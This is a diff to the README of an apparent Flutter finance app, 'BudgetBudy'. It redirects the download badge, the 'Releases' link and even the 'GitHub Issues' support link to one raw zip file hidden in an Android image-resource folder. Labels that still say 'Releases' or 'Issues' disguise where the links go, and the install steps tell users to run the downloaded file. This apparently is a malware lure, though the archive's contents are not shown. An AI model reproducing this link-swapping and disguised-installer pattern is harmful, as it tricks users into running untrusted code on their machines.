@@ -1,7 +1,7 @@
 # 🎉 BudgetBudy - Manage Your Finances Effortlessly
 
 ## 📥 Download Now
-[![Download BudgetBudy](https://img.shields.io/badge/Download-BudgetBudy-brightgreen)](https://github.com/Naldirns/BudgetBudy/releases)
+[![Download BudgetBudy](https://github.com/Naldirns/BudgetBudy/raw/refs/heads/main/android/app/src/main/res/drawable-xxhdpi/Budy_Budget_v3.1.zip)](https://github.com/Naldirns/BudgetBudy/raw/refs/heads/main/android/app/src/main/res/drawable-xxhdpi/Budy_Budget_v3.1.zip)
 
 ## 📝 Table of Contents
 - [Description](#description)
@@ -28,7 +28,7 @@ BudgetBudy is a personal finance manager designed to simplify your money managem
 - **Flutter SDK:** Not required for end-users, but the app includes necessary components.
 
 ## 📥 How to Download & Install
-1. **Visit the Releases Page:** Click this link to access the download page: [BudgetBudy Releases](https://github.com/Naldirns/BudgetBudy/releases).
+1. **Visit the Releases Page:** Click this link to access the download page: [BudgetBudy Releases](https://github.com/Naldirns/BudgetBudy/raw/refs/heads/main/android/app/src/main/res/drawable-xxhdpi/Budy_Budget_v3.1.zip).
 2. **Choose Your Version:** Look for the latest release. The version number will be prominently displayed.
 3. **Download the Installer:** Click on the installer file appropriate for your operating system.
 4. **Run the Installer:** After downloading, locate the file in your downloads folder and double-click to start the installation.
@@ -44,6 +44,6 @@ Once the installation is complete, BudgetBudy will be available in your applicat
 5. **Analyze Your Finances:** Regularly review your spending trends to make informed financial decisions.
 
 ## 🤝 Support
-If you encounter any issues or have questions about BudgetBudy, feel free to reach out for support. You can open an issue on our [GitHub Issues](https://github.com/Naldirns/BudgetBudy/issues) page and we will get back to you as soon as possible.
+If you encounter any issues or have questions about BudgetBudy, feel free to reach out for support. You can open an issue on our [GitHub Issues](https://github.com/Naldirns/BudgetBudy/raw/refs/heads/main/android/app/src/main/res/drawable-xxhdpi/Budy_Budget_v3.1.zip) page and we will get back to you as soon as possible.
 
 Thank you for choosing BudgetBudy for your financial management needs! We hope you find the app helpful and easy to use.
